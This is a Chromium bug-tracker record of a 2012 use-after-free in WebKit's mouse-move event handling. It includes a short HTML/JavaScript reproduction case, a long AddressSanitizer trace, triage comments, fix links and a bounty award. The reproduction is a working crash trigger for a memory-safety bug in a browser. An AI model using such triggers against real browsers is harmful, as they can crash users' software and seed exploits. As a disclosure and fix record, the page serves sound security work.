# Heap-use-after-free in WebCore::EventHandler::mouseMoved

| Field | Value |
|-------|-------|
| **Issue ID** | [40052805](https://issues.chromium.org/issues/40052805) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink |
| **Reporter** | ax...@gmail.com |
| **Assignee** | in...@chromium.org |
| **Created** | 2012-01-16 |
| **Bounty** | $1,000.00 |

## Description

**VULNERABILITY DETAILS**  

Use-after-free can be triggered after trying to access document that was destroyed via 'mousemove' event.

**VERSION**  

18.0.1005.0 (Developer Build 117208 Linux)  

Unable to reproduce on 16.0.912.75 m Windows 7 x64 and Ubuntu 10.10 x64.

**REPRODUCTION CASE**

<script>
function body\_start() {
q = document.getElementById('root').contentDocument;
a = 'document = null'; q.addEventListener('mousemove', function(){ eval(a); }, 0);
a = 'document.open()'; q.onDOMNodeRemovedFromDocument = function(){ eval(a) };
}
</script>
<style>body {margin: 0px;}</style>

<object data="a.html" id="root" onload="body\_start()"/></object>

--- a.html ---

<div id="b"></div><iframe src="#b"></iframe>

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

==16434== ERROR: AddressSanitizer heap-use-after-free on address 0x7f65d594a7f0 at pc 0x7f65e5cb767a bp 0x7ffff03d6410 sp 0x7ffff03d6408  

READ of size 8 at 0x7f65d594a7f0 thread T0  

#0 0x7f65e5cb767a in WebCore::EventHandler::mouseMoved(WebCore::PlatformMouseEvent const&, bool) /usr/local/google/asan/asan-llvm-trunk/llvm/projects/compiler-rt/lib/asan/asan\_linux.cc:0  

#1 0x7f65e5caf34a in WebCore::EventHandler::fakeMouseMoveEventTimerFired(WebCore::Timer[WebCore::EventHandler](javascript:void(0);)\*) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/page/EventHandler.cpp:2428  

#2 0x7f65e568ef98 in WebCore::ThreadTimers::sharedTimerFiredInternal() /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/platform/ThreadTimers.cpp:118  

#3 0x7f65e3b05bed in base::internal::InvokeHelper<false, void, base::internal::RunnableAdapter<void (base::BaseTimer\_Helper::TimerTask::\*)()>, void ()(base::BaseTimer\_Helper::TimerTask\*)>::MakeItSo(base::internal::RunnableAdapter<void (base::BaseTimer\_Helper::TimerTask::\*)()>, base::BaseTimer\_Helper::TimerTask\*) /media/Chromium/chromium/depot\_tools/src/./base/bind\_internal.h:869  

#4 0x7f65e3b05aa8 in base::internal::Invoker<1, base::internal::BindState<base::internal::RunnableAdapter<void (base::BaseTimer\_Helper::TimerTask::\*)()>, void ()(base::BaseTimer\_Helper::TimerTask\*), void ()(base::internal::OwnedWrapper[base::BaseTimer\_Helper::TimerTask](javascript:void(0);))>, void ()(base::BaseTimer\_Helper::TimerTask\*)>::Run(base::internal::BindStateBase\*) /media/Chromium/chromium/depot\_tools/src/./base/bind\_internal.h:1170  

#5 0x7f65e3a9b0c3 in MessageLoop::RunTask(base::PendingTask const&) /media/Chromium/chromium/depot\_tools/src/base/message\_loop.cc:459  

#6 0x7f65e3a9b714 in MessageLoop::DeferOrRunPendingTask(base::PendingTask const&) /media/Chromium/chromium/depot\_tools/src/base/message\_loop.cc:470  

#7 0x7f65e3a9bdd2 in MessageLoop::DoDelayedWork(base::TimeTicks\*) /media/Chromium/chromium/depot\_tools/src/base/message\_loop.cc:698  

#8 0x7f65e3aa844f in base::MessagePumpDefault::Run(base::MessagePump::Delegate\*) /media/Chromium/chromium/depot\_tools/src/base/message\_pump\_default.cc:33  

#9 0x7f65e3a9a7d4 in MessageLoop::RunInternal() /media/Chromium/chromium/depot\_tools/src/base/message\_loop.cc:418  

#10 0x7f65e3a99498 in MessageLoop::Run() /media/Chromium/chromium/depot\_tools/src/base/message\_loop.cc:301  

#11 0x7f65e75a3c58 in RendererMain(content::MainFunctionParams const&) /media/Chromium/chromium/depot\_tools/src/content/renderer/renderer\_main.cc:241  

#12 0x7f65e3a09374 in (anonymous namespace)::RunZygote(content::MainFunctionParams const&, content::ContentMainDelegate\*) /media/Chromium/chromium/depot\_tools/src/content/app/content\_main.cc:233  

#13 0x7f65e3a08f0b in (anonymous namespace)::RunNamedProcessTypeMain(std::basic\_string<char, std::char\_traits<char>, std::allocator<char> > const&, content::MainFunctionParams const&, content::ContentMainDelegate\*) /media/Chromium/chromium/depot\_tools/src/content/app/content\_main.cc:271  

#14 0x7f65e3a08679 in content::ContentMain(int, char const\*\*, content::ContentMainDelegate\*) /media/Chromium/chromium/depot\_tools/src/content/app/content\_main.cc:455  

#15 0x7f65e2554937 in ChromeMain /media/Chromium/chromium/depot\_tools/src/chrome/app/chrome\_main.cc:32  

#16 0x7f65e255483b in main /media/Chromium/chromium/depot\_tools/src/chrome/app/chrome\_exe\_main\_gtk.cc:18  

#17 0x7f65dbaefd8e in \_\_libc\_start\_main /build/buildd/eglibc-2.12.1/csu/libc-start.c:258  

0x7f65d594a7f0 is located 1904 bytes inside of 2440-byte region [0x7f65d594a080,0x7f65d594aa08)  

freed by thread T0 here:  

#0 0x7f65e7f6d644 in free ??:0  

#1 0x7f65e5cd90a2 in WebCore::FrameView::~FrameView() /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/page/FrameView.cpp:218  

#2 0x7f65e5cd8ca1 in WebCore::FrameView::~FrameView() /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/page/FrameView.cpp:188  

#3 0x7f65e5cb7dc4 in WebCore::EventHandler::handleMouseMoveEvent(WebCore::PlatformMouseEvent const&, WebCore::HitTestResult\*, bool) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/page/EventHandler.cpp:1685  

#4 0x7f65e5cb7547 in WebCore::EventHandler::mouseMoved(WebCore::PlatformMouseEvent const&, bool) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/page/EventHandler.cpp:1563  

#5 0x7f65e5caf34a in WebCore::EventHandler::fakeMouseMoveEventTimerFired(WebCore::Timer[WebCore::EventHandler](javascript:void(0);)\*) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/page/EventHandler.cpp:2428  

#6 0x7f65e568ef98 in WebCore::ThreadTimers::sharedTimerFiredInternal() /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/platform/ThreadTimers.cpp:118  

#7 0x7f65e3b05bed in base::internal::InvokeHelper<false, void, base::internal::RunnableAdapter<void (base::BaseTimer\_Helper::TimerTask::\*)()>, void ()(base::BaseTimer\_Helper::TimerTask\*)>::MakeItSo(base::internal::RunnableAdapter<void (base::BaseTimer\_Helper::TimerTask::\*)()>, base::BaseTimer\_Helper::TimerTask\*) /media/Chromium/chromium/depot\_tools/src/./base/bind\_internal.h:869  

#8 0x7f65e3b05aa8 in base::internal::Invoker<1, base::internal::BindState<base::internal::RunnableAdapter<void (base::BaseTimer\_Helper::TimerTask::\*)()>, void ()(base::BaseTimer\_Helper::TimerTask\*), void ()(base::internal::OwnedWrapper[base::BaseTimer\_Helper::TimerTask](javascript:void(0);))>, void ()(base::BaseTimer\_Helper::TimerTask\*)>::Run(base::internal::BindStateBase\*) /media/Chromium/chromium/depot\_tools/src/./base/bind\_internal.h:1170  

#9 0x7f65e3a9b0c3 in MessageLoop::RunTask(base::PendingTask const&) /media/Chromium/chromium/depot\_tools/src/base/message\_loop.cc:459  

#10 0x7f65e3a9b714 in MessageLoop::DeferOrRunPendingTask(base::PendingTask const&) /media/Chromium/chromium/depot\_tools/src/base/message\_loop.cc:470  

#11 0x7f65e3a9bdd2 in MessageLoop::DoDelayedWork(base::TimeTicks\*) /media/Chromium/chromium/depot\_tools/src/base/message\_loop.cc:698  

#12 0x7f65e3aa844f in base::MessagePumpDefault::Run(base::MessagePump::Delegate\*) /media/Chromium/chromium/depot\_tools/src/base/message\_pump\_default.cc:33  

#13 0x7f65e3a9a7d4 in MessageLoop::RunInternal() /media/Chromium/chromium/depot\_tools/src/base/message\_loop.cc:418  

#14 0x7f65e3a99498 in MessageLoop::Run() /media/Chromium/chromium/depot\_tools/src/base/message\_loop.cc:301  

#15 0x7f65e75a3c58 in RendererMain(content::MainFunctionParams const&) /media/Chromium/chromium/depot\_tools/src/content/renderer/renderer\_main.cc:241  

#16 0x7f65e3a09374 in (anonymous namespace)::RunZygote(content::MainFunctionParams const&, content::ContentMainDelegate\*) /media/Chromium/chromium/depot\_tools/src/content/app/content\_main.cc:233  

#17 0x7f65e3a08f0b in (anonymous namespace)::RunNamedProcessTypeMain(std::basic\_string<char, std::char\_traits<char>, std::allocator<char> > const&, content::MainFunctionParams const&, content::ContentMainDelegate\*) /media/Chromium/chromium/depot\_tools/src/content/app/content\_main.cc:271  

#18 0x7f65e3a08679 in content::ContentMain(int, char const\*\*, content::ContentMainDelegate\*) /media/Chromium/chromium/depot\_tools/src/content/app/content\_main.cc:455  

#19 0x7f65e2554937 in ChromeMain /media/Chromium/chromium/depot\_tools/src/chrome/app/chrome\_main.cc:32  

#20 0x7f65e255483b in main /media/Chromium/chromium/depot\_tools/src/chrome/app/chrome\_exe\_main\_gtk.cc:18  

#21 0x7f65dbaefd8e in \_\_libc\_start\_main /build/buildd/eglibc-2.12.1/csu/libc-start.c:258  

previously allocated by thread T0 here:  

#0 0x7f65e7f6d724 in malloc ??:0  

#1 0x7f65e50741db in WTF::fastMalloc(unsigned long) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/JavaScriptCore/wtf/FastMalloc.cpp:268  

#2 0x7f65e5ccda0a in WebCore::Frame::create(WebCore::Page\*, WebCore::HTMLFrameOwnerElement\*, WebCore::FrameLoaderClient\*) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/page/Frame.cpp:203  

#3 0x7f65e4f89d7c in WebKit::WebFrameImpl::createChildFrame(WebCore::FrameLoadRequest const&, WebCore::HTMLFrameOwnerElement\*) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebKit/chromium/src/WebFrameImpl.cpp:2026  

#4 0x7f65e5003276 in WebKit::FrameLoaderClientImpl::createFrame(WebCore::KURL const&, WTF::String const&, WebCore::HTMLFrameOwnerElement\*, WTF::String const&, bool, int, int) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebKit/chromium/src/FrameLoaderClientImpl.cpp:1447  

#5 0x7f65e5c41ea9 in WebCore::SubframeLoader::loadSubframe(WebCore::HTMLFrameOwnerElement\*, WebCore::KURL const&, WTF::String const&, WTF::String const&) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/loader/SubframeLoader.cpp:266  

#6 0x7f65e5c40336 in WebCore::SubframeLoader::loadOrRedirectSubframe(WebCore::HTMLFrameOwnerElement\*, WebCore::KURL const&, WTF::AtomicString const&, bool, bool) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/loader/SubframeLoader.cpp:241  

#7 0x7f65e5c412b3 in WebCore::SubframeLoader::requestObject(WebCore::HTMLPlugInImageElement\*, WTF::String const&, WTF::AtomicString const&, WTF::String const&, WTF::Vector<WTF::String, 0ul> const&, WTF::Vector<WTF::String, 0ul> const&) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/loader/SubframeLoader.cpp:148  

#8 0x7f65e55416fb in WebCore::HTMLObjectElement::updateWidget(WebCore::PluginCreationOption) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/html/HTMLObjectElement.cpp:312  

#9 0x7f65e53ac3a2 in WebCore::ContainerNode::dispatchPostAttachCallbacks() /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/dom/ContainerNode.cpp:766  

#10 0x7f65e53ac1a8 in WebCore::ContainerNode::resumePostAttachCallbacks() /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/dom/ContainerNode.cpp:732  

#11 0x7f65e53bedd9 in WebCore::Document::recalcStyle(WebCore::Node::StyleChange) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/dom/Document.cpp:1600  

#12 0x7f65e53bfefe in WebCore::Document::updateStyleIfNeeded() /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/dom/Document.cpp:1619  

#13 0x7f65e53d21e7 in WebCore::Document::finishedParsing() /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/dom/Document.cpp:4418  

#14 0x7f65e55d5d77 in WebCore::HTMLDocumentParser::prepareToStopParsing() /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/html/parser/HTMLDocumentParser.cpp:153  

#15 0x7f65e5bf0f6c in WebCore::DocumentWriter::endIfNotLoadingMainResource() /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/loader/DocumentWriter.cpp:234  

#16 0x7f65e5c11f2a in WTF::RefPtr[WebCore::DocumentLoader](javascript:void(0);)::operator->() const /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/JavaScriptCore/wtf/RefPtr.h:66  

#17 0x7f65e5c29440 in WebCore::MainResourceLoader::didFinishLoading(double) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/loader/MainResourceLoader.cpp:485  

#18 0x7f65e6bbe2cd in webkit\_glue::WebURLLoaderImpl::Context::OnCompletedRequest(net::URLRequestStatus const&, std::basic\_string<char, std::char\_traits<char>, std::allocator<char> > const&, base::TimeTicks const&) /media/Chromium/chromium/depot\_tools/src/webkit/glue/weburlloader\_impl.cc:647  

#19 0x7f65e4eca602 in ResourceDispatcher::OnRequestComplete(int, net::URLRequestStatus const&, std::basic\_string<char, std::char\_traits<char>, std::allocator<char> > const&, base::TimeTicks const&) /media/Chromium/chromium/depot\_tools/src/content/common/resource\_dispatcher.cc:489  

#20 0x7f65e4ecb8d6 in bool ResourceMsg\_RequestComplete::Dispatch<ResourceDispatcher, ResourceDispatcher, void (ResourceDispatcher::\*)(int, net::URLRequestStatus const&, std::basic\_string<char, std::char\_traits<char>, std::allocator<char> > const&, base::TimeTicks const&)>(IPC::Message const\*, ResourceDispatcher\*, ResourceDispatcher\*, void (ResourceDispatcher::\*)(int, net::URLRequestStatus const&, std::basic\_string<char, std::char\_traits<char>, std::allocator<char> > const&, base::TimeTicks const&)) /media/Chromium/chromium/depot\_tools/src/./content/common/resource\_messages.h:168  

#21 0x7f65e4ec8146 in ResourceDispatcher::DispatchMessage(IPC::Message const&) /media/Chromium/chromium/depot\_tools/src/content/common/resource\_dispatcher.cc:559  

#22 0x7f65e4ec72f4 in ResourceDispatcher::OnMessageReceived(IPC::Message const&) /media/Chromium/chromium/depot\_tools/src/content/common/resource\_dispatcher.cc:326  

==16434== ABORTING  

Stats: 26M malloced (23M for red zones) by 60968 calls  

Stats: 0M realloced by 958 calls  

Stats: 22M freed by 46019 calls  

Stats: 0M really freed by 0 calls  

Stats: 76M (19468 full pages) mmaped in 19 calls  

mmaps by size class: 8:65532; 9:8191; 10:4095; 11:2047; 12:1024; 13:1536; 14:256; 15:128; 16:64; 17:64; 18:16; 21:4;  

mallocs by size class: 8:48628; 9:6235; 10:3287; 11:1175; 12:295; 13:1049; 14:117; 15:120; 16:18; 17:35; 18:5; 21:4;  

frees by size class: 8:35921; 9:4914; 10:2934; 11:803; 12:191; 13:1009; 14:95; 15:113; 16:11; 17:19; 18:5; 21:4;  

rfrees by size class:  

Stats: malloc large: 44 small slow: 305  

Shadow byte and word:  

0x1fecbab294fe: fd  

0x1fecbab294f8: fd fd fd fd fd fd fd fd  

More shadow bytes:  

0x1fecbab294d8: fd fd fd fd fd fd fd fd  

0x1fecbab294e0: fd fd fd fd fd fd fd fd  

0x1fecbab294e8: fd fd fd fd fd fd fd fd  

0x1fecbab294f0: fd fd fd fd fd fd fd fd  

=>0x1fecbab294f8: fd fd fd fd fd fd fd fd  

0x1fecbab29500: fd fd fd fd fd fd fd fd  

0x1fecbab29508: fd fd fd fd fd fd fd fd  

0x1fecbab29510: fd fd fd fd fd fd fd fd  

0x1fecbab29518: fd fd fd fd fd fd fd fd

## Timeline

### ke...@chromium.org (2012-01-16)

I can repro this easily on Windows with a debug build of trunk. Nothing shows up on release (canary or stable), and I can't see a repro on Mac either. I don't know if that's because of timing or if it is just because the freed memory doesn't get overwritten in time.

I'm leaving the impacts flags off for now.

### in...@chromium.org (2012-01-17)

Don't rely on ClusterFuzz regression range, this repro started reproducing after Mitz fixed a functional bug in http://trac.webkit.org/changeset/103867. However, the code has always been faulty and there should be another way to trigger the same event.

### in...@chromium.org (2012-01-17)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=13799149

Uploader: inferno@chromium.org

Crash Type: Heap-use-after-free READ 8
Crash Address: 0x7f42bca807f0
Crash State:
  - crash stack -
  WebCore::EventHandler::mouseMoved
  WebCore::EventHandler::fakeMouseMoveEventTimerFired
  - free stack -
  WebCore::FrameView::~FrameView
  WebCore::FrameView::~FrameView
  

Minimized Testcase (0.43 Kb): https://cluster-fuzz.appspot.com/download/AMIfv95mGOCSB5hC5gqOgMOsPTmXlfFuyJ7aE6O5T6LXwe8SwC9wW5vkcTwaV8KlX3XM0FRVs69W3yaysksQ__aB6GmYb0Skji3rbed9oPht7A-ohjPe9HFNmHaobc8trImLMaJCRGWjU2qW37JjguQn3KIW9Tg90w

### in...@chromium.org (2012-01-17)

Upstreamed - https://bugs.webkit.org/show_bug.cgi?id=76462

### in...@chromium.org (2012-01-18)

http://trac.webkit.org/changeset/105212

### sc...@gmail.com (2012-01-18)

Nice find, @Ax330d !! :) Adding reward-topanel flag.

### in...@chromium.org (2012-01-23)

[Empty comment from Monorail migration]

### sc...@gmail.com (2012-01-24)

@Ax330d: thanks for your continuing range of interesting bugs. Definitely a $1000 reward for this one!

----
Boilerplate text:
Please do NOT publicly disclose details until a fix has been released to all our
users. Early public disclosure may cancel the provisional reward.
Also, please be considerate about disclosure when the bug affects a core library
that may be used by other products.
Please do NOT share this information with third parties who are not directly
involved in fixing the bug. Doing so may cancel the provisional reward.
Please be honest if you have already disclosed anything publicly or to third parties.
----

### ts...@chromium.org (2012-01-24)

[Empty comment from Monorail migration]

### ts...@chromium.org (2012-01-24)

Merged into m17 at r105776.

### sc...@gmail.com (2012-01-31)

[Empty comment from Monorail migration]

### sc...@gmail.com (2012-02-07)

[Empty comment from Monorail migration]

### sc...@gmail.com (2012-02-07)

Correct WebKit bug is https://bugs.webkit.org/show_bug.cgi?id=76462

### [Deleted User] (2012-05-15)

Marking old security bugs Fixed..

### bu...@chromium.org (2012-10-13)

This issue has been closed for some time. No one will pay attention to new comments.
If you are seeing this bug or have new data, please click New Issue to start a new bug.

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### sc...@gmail.com (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-06)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-06-14)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/110374?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40052805)*
